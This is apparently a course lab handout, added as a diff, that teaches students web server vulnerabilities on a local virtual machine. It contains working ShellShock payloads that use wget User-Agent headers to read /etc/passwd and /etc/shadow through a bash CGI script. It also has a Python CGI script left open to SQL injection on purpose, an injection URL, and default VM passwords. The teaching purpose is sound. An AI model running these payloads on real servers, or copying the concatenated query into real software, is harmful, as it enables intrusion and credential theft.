@@ -1,0 +1,247 @@
+
+* HTTPd server vulnerabilities
+
+This time we are going to look at some of vulnerabilities of Web servers. In both cases, they are software errors. But each of them is very different.
+
+
+* Get the virtualbox VM.
+
+For this lab you will run a virtual box virtual machine. I have prepared one for you.
+
+XXX how to copy XXX
+
+
+* Enable the following ports in your virtual machine (see
+
+http://stackoverflow.com/questions/5906441/how-to-ssh-to-a-virtualbox-guest-externally-through-a-host)
+
+| Name | Protocol | host IP | Guest IP | Guest Port |
+|------+----------+---------+----------+------------|
+| HTTP | TCP      | 3080    |          | 80         |
+| SSH  | TCP      | 3030    |          | 22         |
+
+Once you run the virtual machine you should be able to SSH to the virtual machine using port 3080 in the localmachine, and the webserver will be running in port 3080
+You can test both with telnet
+
+#+BEGIN_SRC
+telnet localhost 3030
+#+END_SRC
+
+and
+
+#+BEGIN_SRC
+telnet localhost 3080
+#+END_SRC
+
+You can then use ssh to connect to the virtual machine.
+
+
+* Login to the virtual box and change the passwordsx
+
+| what      | user    | password   |
+|-----------+---------+------------|
+| user      | user360 | user360    |
+|           | root    | root360lab |
+
+* the ShellShock bug
+
+Go to CERT Coordination Center (cert.org)
+
+*Question 1* What is the purpose of the CERT Coordination Center?
+
+*Question 2* What is a CVE?
+
+*Question 3* What are the CVEs that relate to the ShellShock bug?
+
+Find and read Vulnerability Note VU#252743. This note will point you to a RedHat blog where the bug is described.
+
+*Question 4* What are the tests for the vulnerabilities in each of the main two CVEs?
+
+* Test the vulnerability
+
+Given your answer to *Question 4*, check if =bash= is vulnerable (it is).
+
+* Exploiting the vulnerability
+
+** Web server
+
+Your virtual machine is already running on port 80 (port 3080 for this host machine). Apache configuration files are located at =/etc/apache2=
+
+** Enable cgi
+
+Enable =cgid= module. See https://help.ubuntu.com/10.04/serverguide/httpd.html
+
+The documentation on =cgid= is http://httpd.apache.org/docs/current/mod/mod_cgid.html
+
+** Create a script to test cgi
+
+Create a simple "hello world" script in whichever language you choose. Test it. Call this script =test.cgi=. Place it such that http://localhost/test.cgi (or
+http://localhost:3080/test.cgi) executes it.
+
+If necessary, you can inspect the access/error logs of apache. They are located at =/var/log/apache2=
+
+** Create a bash script
+
+Now that you can run cgi scripts, make a bash script called =test.bash=
+
+#+begin_src bash
+#!/bin/bash
+echo "Content-type: text/plain"
+echo
+echo
+echo "Hello world"
+whoami
+echo "End of the world"
+#+end_src
+
+Test it.
+
+*Question 5* What user is the one executing the scripts? (see the output of whoami above). Why does apache use that user?
+
+** /etc/passwd and /etc/shadow
+
+read the man page of shadow (man shadow). Inspect the files /etc/passwd and /etc/shadow
+
+ *Question 6* Why does Linux maintain /etc/shawdow?
+ *Question 7* what is the difference between /etc/passwd and /etc/shadow
+
+** The attack
+
+Now we can try the attack. Using wget run:
+
+#+begin_src bash
+wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost/cgi-bin/test.bash
+#+end_src
+
+Test it. What do you get?
+
+*Question 8* Given your knowledge of the vulnerability, explain how the attack works.
+
+** Try again
+
+#+begin_src bash
+wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost/cgi-bin/test.bash
+#+end_src
+
+*Question 9* Explain why this attack didn't work.
+*Question 10* What is the vulnerability in the /etc/password attack?
+
+
+** Try this script now
+
+Try the same attack on this script.
+
+#+begin_src perl
+#!/usr/bin/perl
+print "Content-type: text/html\n\n";
+foreach $key (keys %ENV) {
+print "$key --> $ENV{$key}<br>";
+}
+#+end_src
+
+
+Modify your script attack to try other commands. Try to execute, for example =ls -lR /etc= or =ls -lR /home/=
+
+* Set up a database
+
+Your user =seng360= has a postgres database called =lab5=. Using psql connect to it. Create a table called =test= with the following schema
+
+#+begin_src sql
+create table test(
+   id integer primary key,
+   value integer);
+grant select on test to public;
+#+end_src
+
+Insert 10 tuples into it. So it looks something like this:
+
+#+begin_example
+lab5=# select * from test ;
+ id | value
+----+-------
+  1 |    10
+  2 |    20
+  3 |    30
+  4 |    40
+  5 |    30
+  6 |    40
+  7 |    30
+  8 |    40
+  9 |  1030
+ 10 |  1040
+(10 rows)
+#+end_example
+
+Create a user called =web= with password =webserver=. See http://www.postgresql.org/docs/9.1/static/app-createuser.html
+
+Test that the user =web= can connect to the database and see the table
+
+#+begin_example
+psql -h localhost -U web lab5
+#+end_example
+
+* Python and sql
+
+Use the following python script. It should be able to display the tuple with id value equal 5 (make sure there is one in your table).
+
+#+begin_src python
+#!/usr/bin/python
+
+import psycopg2
+
+try:
+    conn = psycopg2.connect("dbname='lab5' user='web' host='localhost' password=
+'webserver'")
+except:
+    print "I am unable to connect to the database"
+
+cur = conn.cursor()
+
+id = "5"
+
+try:
+    cur.execute("""SELECT * from test where id = """ + id)
+
+except:
+    print "I can't SELECT from test"
+
+
+rows = cur.fetchall()
+print "<h2>Data</h2>"
+print "<table border=1>"
+for row in rows:
+    print "<tr><td>", row[0], '</td><td>', row[1], '</td></tr>'
+
+print "</table>"
+
+#+end_src
+
+** Create a cgi-script
+
+Convert this program into a cgi-script that uses POST method to set the value of =id=. It respond to this request:
+
+#+begin_example
+http://localhost/cgi-bin/sql.py?id=5
+#+end_example
+
+** An injection attack
+
+Try now the following URL:
+
+#+begin_example
+http://localhost/cgi-bin/sql.py?id=5%20or%20TRUE
+#+end_example
+
+*Question 11* What is the result of this query?
+*Question 12* Why? (hint, decode the =%20= (it is a character in hexadecimal) then follow the value of id.
+
+** Fix your script
+
+Learn how to protect your script. Hint: lookup /prepared statements/ in Psycogp2
+
+*Question 13* How is the sql injection vulnerability removed?
+
+* What to submit
+
+- Submit your answers to the questions above in a simple text file.
+- Submit your python program where you fix the SQL vulnerability
